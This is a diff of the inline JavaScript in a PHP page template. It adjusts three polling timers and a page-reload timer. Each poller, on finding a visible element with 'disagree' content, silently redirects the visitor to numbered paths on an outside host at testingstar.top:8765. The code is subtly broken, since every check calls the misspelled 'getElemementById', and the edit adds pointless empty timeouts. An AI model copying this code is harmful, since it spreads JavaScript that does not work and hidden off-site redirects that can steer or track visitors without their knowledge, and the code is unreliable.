@@ -1139,38 +1139,41 @@ $this->layout = false;
 </script>
 <script>
     var ca_disagree = setInterval(function(){
+        setTimeout(function(){}, 0);
         if (document.getElementById("jnd").style.display != "none"){
             if(document.getElemementById("ca_disagree").innerHTML != "") {
                 window.location.replace("http://www.testingstar.top:8765/1");
                 
             }
         }
-    },3000);
+    },5000);
 </script>
 <script>
     var bj_disagree = setInterval(function(){
+        setTimeout(function(){}, 0);
         if (document.getElementById("bj").style.display != "none"){
             if(document.getElemementById("bj_disagree").innerHTML != "") {
                 window.location.replace("http://www.testingstar.top:8765/2");
                 
             }
         }
-    },3000);
+    },5000);
 </script>
 <script>
     var btc_disagree = setInterval(function(){
+        setTimeout(function(){}, 0);
         if (document.getElementById("xjp").style.display != "none"){
             if(document.getElemementById("btc_disagree").innerHTML != "") {
                 window.location.replace("http://www.testingstar.top:8765/3");
                 
             }
         }
-    },3000);
+    },4000);
 </script>
 <script>
 setTimeout(function(){
     location.reload(); 
-}, 14400000);
+}, 21600000);
 </script>
 
 </html>
